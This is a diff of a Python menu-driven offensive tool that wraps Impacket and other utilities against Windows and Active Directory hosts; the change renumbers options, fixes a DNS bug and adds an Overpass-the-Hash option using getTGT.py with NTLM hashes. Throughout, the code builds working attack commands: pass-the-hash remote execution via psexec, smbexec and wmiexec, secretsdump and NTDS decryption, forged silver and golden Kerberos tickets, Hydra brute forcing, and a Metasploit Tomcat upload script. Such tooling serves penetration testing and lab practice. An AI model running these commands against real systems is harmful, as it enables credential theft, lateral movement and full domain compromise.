@@ -24,6 +24,7 @@ import binascii
 import datetime
 import requests
 import linecache
+
 from termcolor import colored
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
@@ -52,6 +53,7 @@ else:
 # -------------------------------------------------------------------------------------
 
 maxUser = 5000							# UNLIMITED VALUE
+
 colour0 = "red"							# DISPLAY COLOURS
 colour1 = "grey"
 colour2 = "cyan"
@@ -61,10 +63,13 @@ colour5 = "white"
 colour6 = "green"
 colour7 = "yellow"
 colour8 = "magenta"
+
 netWork = "tun0"						# LOCAL INTERFACE
+
 dataDir = "ROGUEAGENT"						# LOCAL DIRECTORY
 workDir = "BLACKBRIAR"
 httpDir = "TREADSTONE"
+
 fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"		# FILE EXTENSIONS
 keyPath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH 2 IMPACKET
 
@@ -443,18 +448,18 @@ def display():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS SERVER  (13) Whois DNS SERVER   (20) GetArch (30) WinDap Search  (40) Kerberos Info  (50) Golden PAC  (60) GenSSHKeyID (70) Hydra FTP  (80) FTP    " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE IP   (14) Recon DNS SERVER   (21) NetView (31) Lookup SIDs    (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra SSH  (81) SSH    " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE PORTS  (15) Dump  DNS SERVER   (22) Service (32) SamDump Users  (42) KerbBruteForce (52) *BloodHound (62) GenListPASS (72) Hydra SMB  (82) SSH ID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEB ADDRESS (16) NMap LIVE PORT     (23) AtExec  (33) REGistryValues (43) KerbRoasting   (53) *BH ACLPwn  (63) Editor USER (73) Hydra POP3 (83) Telnet " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER NAME   (17) NMAP PORT Service  (24) DcomExe (34) List EndPoints (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) Hydra TOM  (84) NetCat " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS WORD   (18) NMap SubDomains    (25) PsExec  (35) Rpc Client     (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) MSF TOMCAT (85) SQSH   " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM HASH   (19) NMap SERVER TIME   (26) SmbExec (36) Smb Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) RemoteSync (86) MSSQL  " + '\u2551')
-   print('\u2551' + "(08) Re/Set DOMAIN NAME                         (27) WmiExec (37) SmbMap SHARE   (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL  " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN SID                          (28) IfMap   (38) SmbCopy Files  (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm  " + '\u2551')
-   print('\u2551' + "(10) Re/Set SHARE NAME                          (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89)        " + '\u2551')
-   print('\u2551' + "(11) Re/Set SERVER TIME                                                                                                                                (90)        " + '\u2551')
-   print('\u2551' + "(12)                                                                                                                                                   (91) Exit   " + '\u2661')
+   print('\u2551' + "(01) Re/Set DNS SERVER  (13) Whois DNS SERVER   (21) GetArch (31) WinDap Search  (41) Kerberos Info  (51) Golden PAC  (61) GenSSHKeyID (71) Hydra FTP  (81) FTP    " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE IP   (14) Dig   DNS SERVER   (22) NetView (32) Lookup SIDs    (42) KerbUserFilter (52) Domain Dump (62) GenListUSER (72) Hydra SSH  (82) SSH    " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE PORTS  (15) Recon DOM SERVER   (23) Service (33) SamDump Users  (43) KerbBruteForce (53) *BloodHound (63) GenListPASS (73) Hydra SMB  (83) SSH ID " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEB ADDRESS (16) Dump  DNS SERVER   (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER (74) Hydra POP3 (84) Telnet " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER NAME   (17) NMAP LIVE PORT     (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS (75) Hydra TOM  (85) NetCat " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS WORD   (18) NMap PORT Service  (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH (76) MSF TOMCAT (86) SQSH   " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM HASH   (19) NMap SubDOMAINS    (27) SmbExec (37) Smb Client     (47) Pass the HASH  (57) PSExec HASH (67) Editor HOST (77) RemoteSync (87) MSSQL  " + '\u2551')
+   print('\u2551' + "(08) Re/Set DOMAIN NAME (20) Nmap Server TIME   (28) WmiExec (38) SmbMap SHARE   (48) OverPass HASH  (58) SmbExecHASH (68) GoPhishing  (78) RSyncDumpS (88) MySQL  " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN SID                          (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (69) GoBuster    (79) RDeskTop   (89) WinRm  " + '\u2551')
+   print('\u2551' + "(10) Re/Set SHARE NAME                          (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (70) Nikto Scan  (80) XDesktop   (90)        " + '\u2551')
+   print('\u2551' + "(11) Re/Set SERVER TIME                                                                                                                                (91)        " + '\u2551')
+   print('\u2551' + "(12)                                                                                                                                                   (92) Exit   " + '\u2661')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -846,7 +851,7 @@ while True:
             print("\n[+] Resetting current DNSERVER IP association...")
             command("sed -i '$d' /etc/resolv.conf")
             DNS = "EMPTY"
-            DNS = spacePadding(DOM, COL1)
+            DNS = spacePadding(DNS, COL1)
             DNSC = 0
          if DNS[:5] != "EMPTY":
             command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
@@ -1094,6 +1099,7 @@ while True:
 
    if selection == '13':
       if DNS[:5] == "EMPTY":
+         print("[-] DNS has not been specified...")
          checkParams = 1      
       if checkParams != 1:
          print("[+] Checking DNS Server...\n")
@@ -1104,16 +1110,34 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - fierce -dns DNS SERVER.
+# Details : Menu option selected - dig DNS
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
-      if DOM[:5] != "EMPTY":
+      if DNS[:5] == "EMPTY":
+         print("[-] DNS has not been specified...")
+         checkParams = 1
+      if checkParams != 1:
+         print("[+] Checking DNS...\n")
+         command("dig authority " + DNS.rstrip(" "))
+      prompt()     
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - fierce -dom DOMAIN.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '15':
+      if DOM[:5] == "EMPTY":
+         print("[-] Domain has not been specified...")
+         checkParams = 1
+      if checkParams != 1:
+         print("[+] Checking DOMAIN server...\n")
          command("fierce --dom " + DOM.rstrip(" "))
-         command("dig " + DNS.rstrip(" "))
-      else:
-         print("[+] DNS Domain has not been specified...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1124,13 +1148,13 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '15':
+   if selection == '16':
       checkParams = testTwo()               
       if USR[:2] == "''":
-         print("\n[-] Username has not been specified...")
+         print("[-] Username has not been specified...")
          checkParams = 1         
       if PAS[:2] == "''":
-         print("\n[-] Password has not been specified...")
+         print("[-] Password has not been specified...")
          checkParams = 1
       if checkParams != 1:
          command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DOM.rstrip(" ") + " --include-tombstoned -r")
@@ -1146,7 +1170,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '16':
+   if selection == '17':
       checkParams = testOne()      
       if checkParams != 1:
             print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
@@ -1169,7 +1193,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '17':
+   if selection == '18':
       checkParams = testOne()  
       if checkParams != 1:
          if POR[:5] != "EMPTY":
@@ -1188,7 +1212,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '18':
+   if selection == '19':
       checkParams = testTwo()
       if checkParams != 1:
          command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
@@ -1202,7 +1226,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '19':
+   if selection == '20':
       checkParams = testOne()
       if checkParams != 1:
          command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" "))
@@ -1217,7 +1241,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '20':
+   if selection == '21':
       checkParams = testOne()
       if checkParams != 1:
          print("[*] Attempting to enumerate architecture...")
@@ -1240,7 +1264,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='21':
+   if selection =='22':
       checkParams = testTwo()
       if checkParams != 1:
          command(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
@@ -1254,7 +1278,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='22':
+   if selection =='23':
       checkParams = testTwo()
       if checkParams != 1:
          command(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
@@ -1268,7 +1292,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '23':
+   if selection == '24':
       checkParams = testTwo()
       if checkParams != 1:
          command(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
@@ -1282,7 +1306,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '24':
+   if selection == '25':
       checkParams = testTwo()         
       if checkParams != 1:
          command(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
@@ -1296,7 +1320,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '25':
+   if selection == '26':
       checkParams = testTwo()         
       if checkParams != 1:
             command(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
@@ -1310,7 +1334,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '26':
+   if selection == '27':
       checkParams = testTwo()      
       if checkParams != 1:
          command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
@@ -1324,7 +1348,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '27':
+   if selection == '28':
       checkParams = testTwo()
       if checkParams != 1:
          command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
@@ -1338,7 +1362,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '28':
+   if selection == '29':
       checkParams = testOne()
       if checkParams != 1:
          command(keyPath + "ifmap.py " + TIP.rstrip(" ") + " 135")
@@ -1352,7 +1376,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '29':
+   if selection == '30':
       checkParams = testOne()      
       if checkParams != 1:
          ifmap = input("[*] Please enter MSRPC interface (ifmap) : ")    
@@ -1369,7 +1393,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='30':
+   if selection =='31':
       checkParams = testTwo()      
       if IP46 == "-6":
          print(colored("[!] WARNING!! Not comptable with IP 6...", colour0))
@@ -1400,7 +1424,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='31':
+   if selection =='32':
       checkParams = testTwo()
       if checkParams != 1:
          print("[*] Enumerating, please wait....")
@@ -1469,7 +1493,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='32':
+   if selection =='33':
       checkParams = testTwo()
       if checkParams != 1:
          print("[*] Enumerating users, please wait this can take sometime...")         
@@ -1530,7 +1554,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='33':
+   if selection =='34':
       checkParams = testTwo()      
       if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password authentication...")
@@ -1545,10 +1569,10 @@ while True:
                keys()
             else:
                if NTM[:5] != "EMPTY" and registryKey.lower() != "quit": 
-                  command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "'")
+                  command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
                else:
                   if registryKey.lower() != "quit":
-                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName ' -s" + registryKey + "'")
+                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName ' -s" + registryKey + "' -s")
       prompt()
             
 # ------------------------------------------------------------------------------------- 
@@ -1559,7 +1583,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='34':
+   if selection =='35':
       checkParams = testTwo()
       if checkParams != 1:
          command(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -1573,7 +1597,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '35':
+   if selection == '36':
       checkParams = testTwo()      
       if checkParams != 1:
          if NTM[:5] == "EMPTY":
@@ -1591,7 +1615,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='36':
+   if selection =='37':
       checkParams = testOne()         
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1630,7 +1654,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '37':
+   if selection == '38':
       checkParams = testTwo()      
       if IP46 == "-6":
          print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour0))
@@ -1667,7 +1691,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '38':
+   if selection == '39':
       checkParams = testTwo()      
       exTensions = fileExt.replace(",","|")
       exTentions = "'(" + exTensions + ")'"            
@@ -1692,7 +1716,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '39':
+   if selection == '40':
       checkParams = testOne()      
       if TSH[:5] == "EMPTY":
          print("[+] SHARE NAME has not been specified...")
@@ -1713,7 +1737,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '40':
+   if selection == '41':
       checkParams = testTwo()
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1731,7 +1755,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '41':
+   if selection == '42':
       checkParams = testTwo()      
       if checkParams != 1:
          print("[*] Enumerating remote server, please wait...")
@@ -1776,7 +1800,7 @@ while True:
 # Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
 # -------------------------------------------------------------------------------------
 
-   if selection =='42':
+   if selection =='43':
       checkParams = testTwo()
       found = 0      
       if checkParams != 1:
@@ -1815,7 +1839,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '43':
+   if selection == '44':
       checkParams = testTwo()      
       if checkParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
@@ -1839,7 +1863,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='44':
+   if selection =='45':
       checkParams = testTwo()
       with open(dataDir + "/usernames.txt", "r") as read:
          for x in range(0, maxUser):
@@ -1869,7 +1893,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '45':
+   if selection == '46':
       if PAS[:1] != "\"":
          NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
          NTM = binascii.hexlify(NTM)
@@ -1893,7 +1917,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '46':
+   if selection == '47':
       checkParams = testTwo()      
       if USR[:2] == "''":
          print("[*] Please enter a valid username for enumeration...")
@@ -1944,12 +1968,22 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Pass the Ticket.
+# Details : Menu option selected - Overpass the HASH/pass the key 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '47':
-      print("[*] Sorry, Pass-the-Ticket has not been implemented yet...")
+   if selection == '48':
+      checkParams = testTwo()
+      if checkParams != 1:
+         print("[*] Trying to create TGT for user " + USR.rstrip(" ") + "...")
+         if (NTM[:1] != ""):
+            print("[i] Using HASH value as password credential...")
+            command(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
+            if os.path.exists(USR.rstrip(" ") + "@" + TIP.rstrip(" ") + ".ccache"):
+               print("[+] Checking TGT status...")
+               privCheck()
+         else:
+            print("[+] TGT was not generated...")                  
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1961,12 +1995,12 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '48':
+   if selection == '49':
       checkParams = testTwo()      
       if checkParams == 0:
-         checkParams = testThree()
+         checkParams = testThree()         
       if checkParams != 1:
-         print("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...\n")         
+         print("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...")
          if (NTM[:1] != "") & (SID[:1] != ""):
             print("[i] Using HASH value as password credential...")
             command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))
@@ -1986,7 +2020,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '49':
+   if selection == '50':
       checkParams = testTwo()      
       if checkParams == 0:
          checkParams = testThree()
@@ -2010,7 +2044,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='50':
+   if selection =='51':
       checkParams = testTwo()
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -2028,7 +2062,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='51':
+   if selection =='52':
       checkParams = testTwo()
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -2048,7 +2082,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='52':
+   if selection =='53':
       checkParams = testTwo()      
       if checkParams != 1:
          print ("[*] Enumerating, please wait...")     
@@ -2066,7 +2100,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='53':
+   if selection =='54':
       checkParams = testTwo()
       if checkParams != 1:
          BH1 = input("[+] Enter Neo4j username: ")
@@ -2085,7 +2119,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='54':
+   if selection =='55':
       checkParams = testTwo()
       if checkParams != 1:
          print("Enumerating, please wait...\n")
@@ -2139,7 +2173,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='55':
+   if selection =='56':
       checkParams = testTwo()
       if checkParams != 1:
          if PAS[:2] != "''":
@@ -2177,7 +2211,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='56':
+   if selection =='57':
       checkParams = testTwo()
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
@@ -2192,7 +2226,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='57':
+   if selection =='58':
       checkParams = testTwo()
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
@@ -2207,7 +2241,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='58':
+   if selection =='59':
       checkParams = testTwo()      
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
@@ -2222,7 +2256,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='59':           
+   if selection =='60':           
       print("[*] Checking " + workDir + " for relevant files...")
       if os.path.exists("./" + workDir + "/ntds.dit"):
          print("[+] File ntds.dit found...")
@@ -2270,7 +2304,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='60':
+   if selection =='61':
       print("[*] Generating Keys...\n")
       command("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
       command("tput setaf 2; tput bold")
@@ -2291,7 +2325,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='61':
+   if selection =='62':
       checkParams = testOne()   
       if checkParams != 1:
          if WEB[:1] != "":
@@ -2319,7 +2353,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='62':
+   if selection =='63':
       checkParams = testOne()     
       if checkParams != 1:
          if WEB[:1] != "":
@@ -2344,7 +2378,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='63':
+   if selection =='64':
       command("nano " + dataDir + "/usernames.txt")      
       for x in range (0, maxUser):
          USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
@@ -2359,7 +2393,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='64':
+   if selection =='65':
       command("nano " + dataDir + "/passwords.txt")      
       for x in range (0, maxUser):
          HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
@@ -2374,7 +2408,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='65':
+   if selection =='66':
       command("nano " + dataDir + "/hashes.txt")           
       for x in range (0, maxUser):
             HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
@@ -2389,7 +2423,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='66':
+   if selection =='67':
       command("nano /etc/hosts")
       prompt()
       
@@ -2401,7 +2435,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='67':
+   if selection =='68':
       checkParams = testTwo()
       if "25" not in POR:
          print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour0))
@@ -2476,7 +2510,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='68':
+   if selection =='69':
       checkParams = testOne()           
       if checkParams != 1:
          if WEB[:5] == "EMPTY":
@@ -2496,7 +2530,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='69':
+   if selection =='70':
       checkParams = testOne()
       if checkParams != 1:
          if ":" in TIP:
@@ -2517,7 +2551,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='70':
+   if selection =='71':
       checkParams = testOne()         
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2553,7 +2587,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='71':
+   if selection =='72':
       checkParams = testOne()         
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2589,7 +2623,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='72':
+   if selection =='73':
       checkParams = testOne()
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2625,7 +2659,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='73':
+   if selection =='74':
       checkParams = testOne()         
       if checkParams != 1:
          if os.path.getsize(dataDir + "/usernames.txt") == 0:
@@ -2664,7 +2698,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='74':  
+   if selection =='75':  
       if WEB[:5] == "EMPTY":
          print("[+] Target web address not specified...")
       else:
@@ -2698,7 +2732,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='75':
+   if selection =='76':
       command("touch meterpreter.rc")
       command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
       command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
@@ -2731,7 +2765,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='76':
+   if selection =='77':
       checkParams = testOne()   
       if checkParams != 1:
          if "873" in POR:
@@ -2748,7 +2782,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='77':
+   if selection =='78':
       checkParams = testOne()      
       if checkParams != 1:
          if "873" in POR:
@@ -2765,7 +2799,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='78':
+   if selection =='79':
       checkParams = testOne()   
       if checkParams != 1:
          command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
@@ -2779,7 +2813,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '79':
+   if selection == '80':
       checkParams = testOne()      
       if checkParams != 1:
          command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
@@ -2793,7 +2827,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='80':
+   if selection =='81':
       checkParams = testOne()      
       if checkParams != 1:
          command("ftp " + TIP.rstrip(" ") + " 21")
@@ -2807,7 +2841,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='81':
+   if selection =='82':
       checkParams = testOne()      
       if checkParams != 1:
          command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
@@ -2821,7 +2855,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='82':
+   if selection =='83':
       checkParams = testOne()      
       if checkParams != 1:
          command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
@@ -2835,7 +2869,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='83':
+   if selection =='84':
       checkParams = testOne()      
       if checkParams != 1:
          command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
@@ -2849,7 +2883,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='84':
+   if selection =='85':
       checkParams = testOne()      
       if checkParams != 1:
          command("nc " + TIP.rstrip(" ") + " 80")
@@ -2863,7 +2897,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='85':
+   if selection =='86':
       checkParams = testOne()      
       if checkParams != 1:
          command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
@@ -2877,7 +2911,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='86':
+   if selection =='87':
       checkParams = testTwo()   
       if checkParams != 1:
           command(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -2893,7 +2927,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='87':
+   if selection =='88':
       checkParams = testOne()      
       if checkParams != 1:
